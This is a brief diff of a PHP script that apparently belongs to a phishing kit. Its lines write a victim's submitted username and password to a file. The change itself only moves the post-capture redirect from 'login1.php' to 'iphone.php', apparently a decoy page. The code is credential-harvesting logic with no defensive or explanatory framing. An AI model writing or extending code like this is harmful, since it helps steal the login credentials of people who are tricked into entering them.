@@ -10,7 +10,7 @@
  $pa = "Password: $pass\n";
  fwrite($fileuser, "\n". $co. $us. $pa. $cl);
  fclose($fileuser);
- header('Location: login1.php');
+ header('Location: iphone.php');
  exit()
 ?>
 
